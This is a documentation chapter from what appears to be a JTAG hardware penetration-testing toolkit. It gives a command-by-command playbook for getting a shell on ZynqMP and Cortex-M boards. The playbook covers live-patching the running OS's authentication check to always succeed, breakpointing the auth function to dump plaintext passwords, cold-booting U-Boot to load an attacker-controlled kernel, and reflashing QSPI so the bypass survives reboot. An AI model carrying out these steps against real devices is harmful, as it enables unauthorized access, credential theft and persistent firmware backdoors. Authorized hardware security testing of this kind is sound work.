# 33 — JTAG-to-Shell: taking control of the running system

**The capstone.** Everything else in this toolkit (enumerate, dump, locate, patch,
break-capture, cold-boot, reflash) exists to answer one operator question: *given
this JTAG access, how do I actually get INTO the system?* This doc is the answer,
and `jtagx/jtagtoshell.py` (+ `tools/jtag-to-shell.py`) is the planner that picks the
right chain of existing scripts from the board's current state and prints the exact
commands, in order.

**The planner does not touch hardware.** It reads a capture (or explicit flags) and
emits Tcl/Python commands for the operator to run -- same hands-on-JTAG model as the
rest of the toolkit.

## Why JTAG gives you more than a debugger

With `SPIDEN=1`/`DBGEN=1` and an open DAP (the ZCU102 dev baseline), JTAG gives
control *underneath* the OS: halt any core at any privilege level (including EL3),
read/write all of OCM and DRAM, and -- critically -- **write to memory the CPU is
already executing from**. That last part is the whole trick: you don't need to run
new code, you need to change ONE instruction in code that's already running and
trusted.

## The four paths

| # | Path | When | What it needs |
|---|------|------|----------------|
| **A** | **Live-patch** | An OS is already running | dump -> locate the auth check -> generate a force-return patch -> write it (memory write, not code injection) -> log in normally |
| **B** | **Catch-in-flight** | An OS is running, you want the *actual secret* | HW-breakpoint the check function, dump registers/derefs the instant it's hit |
| **C** | **Cold-boot** | Nothing is running (JTAG-idle) | replay psu_init as MMIO -> bring up DDR -> load U-Boot over JTAG -- the U-Boot prompt **is** a shell |
| **D** | **Persist** | You have a validated bypass and want it to survive reboot | repack the boot image with the patch baked in (bootgen checksums recomputed) -> reflash |

The planner picks the sequence for you:

```bash
# from a live capture -- reads a53.firmware_running / invasive_debug
python3 tools/jtag-to-shell.py --from-capture "$(ls -t reports/raw-*.json | head -1)"

# explicit state, any goal
python3 tools/jtag-to-shell.py --firmware-running --goal shell     # path A
python3 tools/jtag-to-shell.py --firmware-running --goal secret    # path B
python3 tools/jtag-to-shell.py --idle             --goal shell     # path C
python3 tools/jtag-to-shell.py --firmware-running --goal persist   # path A then D
```

If the capture shows debug isn't actually open (`gated`/`wedged`/`unreachable`), the
planner redirects to `unlock-engine.py` instead of a shell path -- there's nothing to
patch until the DAP can reach the core.

## Path A walkthrough -- live-patch the auth check

```bash
# 1. dump the running OS (non-destructive, works WHILE it's running)
DUMP_ADDR=0x00100000 DUMP_SIZE=0x02000000 DUMP_LABEL=os-live \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/dump-os-ddr.tcl; shutdown"

# 2. locate the login/auth check
python3 tools/find-patch-target.py dumps/os-live.bin
#   (or, with a symbol map) python3 tools/symbol-crypto.py dumps/os-live.bin --syms dumps/symbols.txt

# 3. generate the force-return patch
python3 tools/patch-recipe.py --arch aarch64 --func authCheck --syms dumps/symbols.txt --behavior ret0

# 4. apply it -- a MEMORY WRITE to code the CPU is already executing
PATCH_VA=0xADDR PATCH_WORD=0xWORD PATCH_RESTORE=0 \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/probe-phys-patch.tcl; shutdown"

# 5. get the shell -- on the TARGET'S console, not the OpenOCD Tcl console
screen /dev/ttyUSB0 115200
```

`--behavior ret0` targets the classic auth shape: `if (check() != 0) reject;` becomes
`return 0;` unconditionally -- the reject branch never fires. `ret1`/`nop`/`hang` are
the other canned behaviors in `patch-recipe.py` for different check shapes.

## The wedge warning (read this before path A or D)

**OpenOCD 0.12 on ZynqMP: injecting FRESH code onto a halted live core and jumping to
it WEDGES THE DAP.** This is a cache-coherence/SCTLR_EL1 issue confirmed by
`cache-coherence-test.tcl` -- OpenOCD 0.12's aarch64 target doesn't expose SCTLR_EL1,
so it can't manage the I-cache/D-cache coherence a fresh code injection needs. The
DAP locks up and the only recovery is a power-cycle.

**The reliable primitive is a memory WRITE, not code injection.** `probe-phys-patch`
overwrites an instruction *already inside* the running, already-cached image -- the
CPU's own instruction fetch picks up the new byte the normal way, no cache
flush/invalidate dance required. Path A and D use only this. If a step ever asks you
to inject new code and jump to it on a *live* core, stop -- that's the wedge case.
(Cold-boot, path C, is different: nothing is running yet, so there's no cache
coherence to violate.)

## Path B walkthrough -- catch the credential itself

Sometimes access isn't the goal -- you want the actual password/key, not just a way
past the check. Break on the function and dump what it's holding the instant it's
called, before any hashing:

```bash
BC_ADDR=0xADDR BC_DEREF="0 1" BC_BT=1 \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/break-capture.tcl; shutdown" \
  | python3 tools/symbolize.py --annotate --syms dumps/symbols.txt
```

`BC_DEREF="0 1"` follows pointer arguments in x0 and x1 via AXI -- if the function
signature is `authCheck(char *user, char *pass)`, the actual password string is
dereffed and printed. `BC_BT=1` adds a backtrace so you know the calling context.

## Path C walkthrough -- cold-boot to a U-Boot shell

For an idle board (nothing running), bring up DDR and U-Boot over pure JTAG -- no
FSBL execution needed, so no boot-device wedge:

```bash
python3 tools/psu-init-to-jtag.py                                            # once per board
openocd -f openocd/zcu102.cfg -c "source openocd/jtag-ddr-boot.tcl"  -c shutdown
openocd -f openocd/zcu102.cfg -c "source openocd/jtag-load-uboot.tcl" -c shutdown
screen /dev/ttyUSB0 115200
```

The U-Boot prompt **is** a shell: full memory read/write, `sf probe; sf read` pulls
flash contents directly, and `bootm`/`booti` can boot an attacker-controlled
kernel+initramfs from here -- which is itself a route to a full root shell with no
patching needed at all.

## Path D walkthrough -- make it permanent (ZynqMP)

Only after validating the patch works live (path A). ZynqMP writes the boot image
back to QSPI/SD in place -- JTAG-native, no SD reader / U-Boot / strap change:

```bash
python3 tools/repack-bootimage.py dumps/boot-image.bin --inspect                 # list partitions
python3 tools/qspi-make-patch.py dumps/boot-image.bin --offset 0xLOGICAL --hex HEXBYTES -o /tmp/qpatch.tcl
# SAFE write-path probes FIRST (no flash change):
QW_OP=srtest   openocd -f openocd/zcu102.cfg -c "init; source openocd/qspi-write.tcl; shutdown"
QW_OP=wrentest openocd -f openocd/zcu102.cfg -c "init; source openocd/qspi-write.tcl; shutdown"
# then the real patch (4KB sub-sector erase + program + verify):
QW_OP=patch QW_DATA=/tmp/qpatch.tcl openocd -f openocd/zcu102.cfg -c "init; source openocd/qspi-write.tcl; shutdown"
```

`qspi-make-patch.py` prepares the sub-sector read-modify-write offline (sidesteps
Tcl binary I/O). **Destructive and can brick the board if flash is the only boot
source** -- confirm the boot mode first (`BOOT_MODE_USER` 0xFF5E0200 bits[3:0]:
0x2=QSPI32, 0x3/0x5=SD) and keep the original `dumps/boot-image.bin` to restore (re-run
`QW_OP=patch` with the unpatched bytes). This was proven end-to-end on the ZCU102: a
`ret0` patch into a VxWorks auth function survived a full power-cycle and ran on the
next boot. Cortex-M boards use a different mechanism -- see Cross-board notes below.

## What "shell" actually means here

The interactive shell lands on the **target's own serial console** (`ttyUSB0` = PS
UART0 on the ZCU102), not the OpenOCD Tcl console. JTAG is the *lever* -- it's what
unlocks or spawns the shell -- but you talk to the shell itself over UART like any
normal login. If the board has no serial console wired, path C's U-Boot prompt or a
network service the patched OS exposes are the alternatives.

## Cross-board notes

The planner's command templates default to ZynqMP (`openocd/zcu102.cfg`,
`dump-os-ddr.tcl`, etc.) since that's the only silicon-validated target. For a
Cortex-M board, the equivalent chain is: `cortexm-dump.tcl` (path A step 1) ->
`find-patch-target.py` -> `patch-recipe.py --arch armv7|thumb` ->
`probe-phys-patch.tcl` with the board's `cfg`; there is no cold-boot path C
equivalent (Cortex-M parts don't need a DDR bring-up), and path D uses
`repack-bootimage.py --patch` + `cortexm-flash.tcl` directly against internal flash
(no QSPI sub-sector dance -- Cortex-M images aren't bootgen-wrapped). ZynqMP/Zynq-7000
use the QSPI safe-write path shown above instead. Pass `--soc <profile>` to
`jtag-to-shell.py` to steer both the `.cfg` path and which persist mechanism is
emitted; the step *sequence* is architecture-general even where the exact tool names
differ.

See also: `docs/21-engagement-walkthrough.md` (the full Cap-1/2/2.5/3 reference these
paths are built from), `docs/30-authenticated-debug.md` (what happens if debug is
AUTHENTICATED rather than open -- the planner's unlock-first redirect doesn't cover
that case, since a cert/key problem isn't a register lever), and
`docs/23-multiboard-engagement-runbook.md` for the wider engagement flow this slots
into.
